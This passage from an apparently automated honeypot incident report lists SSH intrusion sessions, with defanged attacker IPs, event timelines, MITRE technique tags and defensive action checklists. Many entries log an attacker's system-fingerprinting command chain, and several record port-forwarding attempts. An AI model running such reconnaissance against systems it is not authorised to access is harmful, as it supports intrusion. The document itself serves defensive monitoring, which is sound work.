| `2026-07-09 13:38:52` | `cowrie.client.kex` |
| `2026-07-09 13:38:54` | `cowrie.login.success` |
| `2026-07-09 13:38:55` | `cowrie.session.params` |
| `2026-07-09 13:38:55` | `cowrie.command.input` |
| `2026-07-09 13:38:55` | `cowrie.command.input` |
| `2026-07-09 13:38:55` | `cowrie.command.input` |
| `2026-07-09 13:38:55` | `cowrie.command.input` |
| `2026-07-09 13:38:55` | `cowrie.command.input` |
| `2026-07-09 13:38:55` | `cowrie.command.success` |
| `2026-07-09 13:38:55` | `cowrie.command.input` |
| `2026-07-09 13:38:55` | `cowrie.command.input` |
| `2026-07-09 13:38:55` | `cowrie.command.input` |
| `2026-07-09 13:38:55` | `cowrie.command.input` |
| `2026-07-09 13:38:56` | `cowrie.log.closed` |
| `2026-07-09 13:38:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d95d2a8458c2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:40 |
| **Last Seen** | 2026-07-09 13:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:40:57` | `cowrie.session.connect` |
| `2026-07-09 13:40:57` | `cowrie.client.version` |
| `2026-07-09 13:40:57` | `cowrie.client.kex` |
| `2026-07-09 13:40:59` | `cowrie.login.success` |
| `2026-07-09 13:41:00` | `cowrie.session.params` |
| `2026-07-09 13:41:00` | `cowrie.command.input` |
| `2026-07-09 13:41:00` | `cowrie.command.input` |
| `2026-07-09 13:41:00` | `cowrie.command.input` |
| `2026-07-09 13:41:00` | `cowrie.command.input` |
| `2026-07-09 13:41:00` | `cowrie.command.input` |
| `2026-07-09 13:41:00` | `cowrie.command.success` |
| `2026-07-09 13:41:00` | `cowrie.command.input` |
| `2026-07-09 13:41:00` | `cowrie.command.input` |
| `2026-07-09 13:41:00` | `cowrie.command.input` |
| `2026-07-09 13:41:00` | `cowrie.command.input` |
| `2026-07-09 13:41:01` | `cowrie.log.closed` |
| `2026-07-09 13:41:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dd8a7c27fa0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:43 |
| **Last Seen** | 2026-07-09 13:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:43:06` | `cowrie.session.connect` |
| `2026-07-09 13:43:06` | `cowrie.client.version` |
| `2026-07-09 13:43:06` | `cowrie.client.kex` |
| `2026-07-09 13:43:08` | `cowrie.login.success` |
| `2026-07-09 13:43:09` | `cowrie.session.params` |
| `2026-07-09 13:43:09` | `cowrie.command.input` |
| `2026-07-09 13:43:09` | `cowrie.command.input` |
| `2026-07-09 13:43:09` | `cowrie.command.input` |
| `2026-07-09 13:43:09` | `cowrie.command.input` |
| `2026-07-09 13:43:09` | `cowrie.command.input` |
| `2026-07-09 13:43:09` | `cowrie.command.success` |
| `2026-07-09 13:43:09` | `cowrie.command.input` |
| `2026-07-09 13:43:09` | `cowrie.command.input` |
| `2026-07-09 13:43:09` | `cowrie.command.input` |
| `2026-07-09 13:43:09` | `cowrie.command.input` |
| `2026-07-09 13:43:09` | `cowrie.log.closed` |
| `2026-07-09 13:43:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-680ab820c468

| Field | Detail |
|---|---|
| **Source IP** | `218.202.143[.]68` |
| **First Seen** | 2026-07-09 13:44 |
| **Last Seen** | 2026-07-09 13:45 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:44:50` | `cowrie.session.connect` |
| `2026-07-09 13:44:51` | `cowrie.client.version` |
| `2026-07-09 13:44:51` | `cowrie.client.kex` |
| `2026-07-09 13:44:54` | `cowrie.login.success` |
| `2026-07-09 13:44:55` | `cowrie.direct-tcpip.request` |
| `2026-07-09 13:45:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.202.143[.]68` to AbuseIPDB if not already reported
- [ ] Block `218.202.143[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9983595f8b6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:45 |
| **Last Seen** | 2026-07-09 13:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:45:17` | `cowrie.session.connect` |
| `2026-07-09 13:45:17` | `cowrie.client.version` |
| `2026-07-09 13:45:17` | `cowrie.client.kex` |
| `2026-07-09 13:45:19` | `cowrie.login.success` |
| `2026-07-09 13:45:20` | `cowrie.session.params` |
| `2026-07-09 13:45:20` | `cowrie.command.input` |
| `2026-07-09 13:45:20` | `cowrie.command.input` |
| `2026-07-09 13:45:20` | `cowrie.command.input` |
| `2026-07-09 13:45:20` | `cowrie.command.input` |
| `2026-07-09 13:45:20` | `cowrie.command.input` |
| `2026-07-09 13:45:20` | `cowrie.command.success` |
| `2026-07-09 13:45:20` | `cowrie.command.input` |
| `2026-07-09 13:45:20` | `cowrie.command.input` |
| `2026-07-09 13:45:20` | `cowrie.command.input` |
| `2026-07-09 13:45:20` | `cowrie.command.input` |
| `2026-07-09 13:45:21` | `cowrie.log.closed` |
| `2026-07-09 13:45:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d18fa26cbdb

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-09 13:45 |
| **Last Seen** | 2026-07-09 13:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:45:31` | `cowrie.session.connect` |
| `2026-07-09 13:45:31` | `cowrie.client.version` |
| `2026-07-09 13:45:31` | `cowrie.client.kex` |
| `2026-07-09 13:45:31` | `cowrie.login.success` |
| `2026-07-09 13:45:31` | `cowrie.direct-tcpip.request` |
| `2026-07-09 13:45:31` | `cowrie.direct-tcpip.data` |
| `2026-07-09 13:45:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17ae4da2f2f9

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 13:45 |
| **Last Seen** | 2026-07-09 13:46 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:45:55` | `cowrie.session.connect` |
| `2026-07-09 13:45:56` | `cowrie.client.version` |
| `2026-07-09 13:45:56` | `cowrie.client.kex` |
| `2026-07-09 13:46:02` | `cowrie.login.success` |
| `2026-07-09 13:46:05` | `cowrie.session.params` |
| `2026-07-09 13:46:05` | `cowrie.command.input` |
| `2026-07-09 13:46:06` | `cowrie.log.closed` |
| `2026-07-09 13:46:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-077b643466bb

| Field | Detail |
|---|---|
| **Source IP** | `179.184.85[.]167` |
| **First Seen** | 2026-07-09 13:46 |
| **Last Seen** | 2026-07-09 13:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:46:27` | `cowrie.session.connect` |
| `2026-07-09 13:46:28` | `cowrie.client.version` |
| `2026-07-09 13:46:28` | `cowrie.client.kex` |
| `2026-07-09 13:46:31` | `cowrie.login.success` |
| `2026-07-09 13:46:31` | `cowrie.direct-tcpip.request` |
| `2026-07-09 13:46:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.85[.]167` to AbuseIPDB if not already reported
- [ ] Block `179.184.85[.]167` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-066e073b1536

| Field | Detail |
|---|---|
| **Source IP** | `37.28.177[.]141` |
| **First Seen** | 2026-07-09 13:46 |
| **Last Seen** | 2026-07-09 13:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:46:36` | `cowrie.session.connect` |
| `2026-07-09 13:46:37` | `cowrie.client.version` |
| `2026-07-09 13:46:37` | `cowrie.client.kex` |
| `2026-07-09 13:46:38` | `cowrie.login.success` |
| `2026-07-09 13:46:39` | `cowrie.direct-tcpip.request` |
| `2026-07-09 13:46:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.28.177[.]141` to AbuseIPDB if not already reported
- [ ] Block `37.28.177[.]141` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56663881370e

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-09 13:47 |
| **Last Seen** | 2026-07-09 13:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:47:30` | `cowrie.session.connect` |
| `2026-07-09 13:47:30` | `cowrie.client.version` |
| `2026-07-09 13:47:30` | `cowrie.client.kex` |
| `2026-07-09 13:47:30` | `cowrie.login.success` |
| `2026-07-09 13:47:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c67b7300ee7

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-09 13:47 |
| **Last Seen** | 2026-07-09 13:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:47:30` | `cowrie.session.connect` |
| `2026-07-09 13:47:30` | `cowrie.client.version` |
| `2026-07-09 13:47:30` | `cowrie.client.kex` |
| `2026-07-09 13:47:30` | `cowrie.login.success` |
| `2026-07-09 13:47:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8d08e7de86e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:47 |
| **Last Seen** | 2026-07-09 13:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:47:31` | `cowrie.session.connect` |
| `2026-07-09 13:47:31` | `cowrie.client.version` |
| `2026-07-09 13:47:31` | `cowrie.client.kex` |
| `2026-07-09 13:47:32` | `cowrie.login.success` |
| `2026-07-09 13:47:34` | `cowrie.session.params` |
| `2026-07-09 13:47:34` | `cowrie.command.input` |
| `2026-07-09 13:47:34` | `cowrie.command.input` |
| `2026-07-09 13:47:34` | `cowrie.command.input` |
| `2026-07-09 13:47:34` | `cowrie.command.input` |
| `2026-07-09 13:47:34` | `cowrie.command.input` |
| `2026-07-09 13:47:34` | `cowrie.command.success` |
| `2026-07-09 13:47:34` | `cowrie.command.input` |
| `2026-07-09 13:47:34` | `cowrie.command.input` |
| `2026-07-09 13:47:34` | `cowrie.command.input` |
| `2026-07-09 13:47:34` | `cowrie.command.input` |
| `2026-07-09 13:47:34` | `cowrie.log.closed` |
| `2026-07-09 13:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c205fe55c525

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-09 13:47 |
| **Last Seen** | 2026-07-09 13:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:47:34` | `cowrie.session.connect` |
| `2026-07-09 13:47:34` | `cowrie.client.version` |
| `2026-07-09 13:47:34` | `cowrie.client.kex` |
| `2026-07-09 13:47:34` | `cowrie.login.success` |
| `2026-07-09 13:47:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78cec8154931

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-09 13:47 |
| **Last Seen** | 2026-07-09 13:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:47:34` | `cowrie.session.connect` |
| `2026-07-09 13:47:34` | `cowrie.client.version` |
| `2026-07-09 13:47:34` | `cowrie.client.kex` |
| `2026-07-09 13:47:34` | `cowrie.login.success` |
| `2026-07-09 13:47:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c605b14415d3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:49 |
| **Last Seen** | 2026-07-09 13:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:49:46` | `cowrie.session.connect` |
| `2026-07-09 13:49:46` | `cowrie.client.version` |
| `2026-07-09 13:49:46` | `cowrie.client.kex` |
| `2026-07-09 13:49:49` | `cowrie.login.success` |
| `2026-07-09 13:49:50` | `cowrie.session.params` |
| `2026-07-09 13:49:50` | `cowrie.command.input` |
| `2026-07-09 13:49:50` | `cowrie.command.input` |
| `2026-07-09 13:49:50` | `cowrie.command.input` |
| `2026-07-09 13:49:50` | `cowrie.command.input` |
| `2026-07-09 13:49:50` | `cowrie.command.input` |
| `2026-07-09 13:49:50` | `cowrie.command.success` |
| `2026-07-09 13:49:50` | `cowrie.command.input` |
| `2026-07-09 13:49:50` | `cowrie.command.input` |
| `2026-07-09 13:49:50` | `cowrie.command.input` |
| `2026-07-09 13:49:50` | `cowrie.command.input` |
| `2026-07-09 13:49:51` | `cowrie.log.closed` |
| `2026-07-09 13:49:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e329fd8adf80

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:51 |
| **Last Seen** | 2026-07-09 13:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:51:53` | `cowrie.session.connect` |
| `2026-07-09 13:51:53` | `cowrie.client.version` |
| `2026-07-09 13:51:53` | `cowrie.client.kex` |
| `2026-07-09 13:51:54` | `cowrie.login.success` |
| `2026-07-09 13:51:56` | `cowrie.session.params` |
| `2026-07-09 13:51:56` | `cowrie.command.input` |
| `2026-07-09 13:51:56` | `cowrie.command.input` |
| `2026-07-09 13:51:56` | `cowrie.command.input` |
| `2026-07-09 13:51:56` | `cowrie.command.input` |
| `2026-07-09 13:51:56` | `cowrie.command.input` |
| `2026-07-09 13:51:56` | `cowrie.command.success` |
| `2026-07-09 13:51:56` | `cowrie.command.input` |
| `2026-07-09 13:51:56` | `cowrie.command.input` |
| `2026-07-09 13:51:56` | `cowrie.command.input` |
| `2026-07-09 13:51:56` | `cowrie.command.input` |
| `2026-07-09 13:51:56` | `cowrie.log.closed` |
| `2026-07-09 13:51:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c35b5a31284

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:54 |
| **Last Seen** | 2026-07-09 13:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:54:00` | `cowrie.session.connect` |
| `2026-07-09 13:54:00` | `cowrie.client.version` |
| `2026-07-09 13:54:00` | `cowrie.client.kex` |
| `2026-07-09 13:54:02` | `cowrie.login.success` |
| `2026-07-09 13:54:03` | `cowrie.session.params` |
| `2026-07-09 13:54:03` | `cowrie.command.input` |
| `2026-07-09 13:54:03` | `cowrie.command.input` |
| `2026-07-09 13:54:03` | `cowrie.command.input` |
| `2026-07-09 13:54:03` | `cowrie.command.input` |
| `2026-07-09 13:54:03` | `cowrie.command.input` |
| `2026-07-09 13:54:03` | `cowrie.command.success` |
| `2026-07-09 13:54:03` | `cowrie.command.input` |
| `2026-07-09 13:54:03` | `cowrie.command.input` |
| `2026-07-09 13:54:03` | `cowrie.command.input` |
| `2026-07-09 13:54:03` | `cowrie.command.input` |
| `2026-07-09 13:54:04` | `cowrie.log.closed` |
| `2026-07-09 13:54:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dadfe19caeb

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-09 13:54 |
| **Last Seen** | 2026-07-09 13:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:54:06` | `cowrie.session.connect` |
| `2026-07-09 13:54:06` | `cowrie.client.version` |
| `2026-07-09 13:54:06` | `cowrie.client.kex` |
| `2026-07-09 13:54:07` | `cowrie.login.success` |
| `2026-07-09 13:54:07` | `cowrie.direct-tcpip.request` |
| `2026-07-09 13:54:07` | `cowrie.direct-tcpip.data` |
| `2026-07-09 13:54:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2476699f7689

| Field | Detail |
|---|---|
| **Source IP** | `113.140.95[.]250` |
| **First Seen** | 2026-07-09 13:55 |
| **Last Seen** | 2026-07-09 13:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:55:01` | `cowrie.session.connect` |
| `2026-07-09 13:55:01` | `cowrie.client.version` |
| `2026-07-09 13:55:01` | `cowrie.client.kex` |
| `2026-07-09 13:55:03` | `cowrie.login.success` |
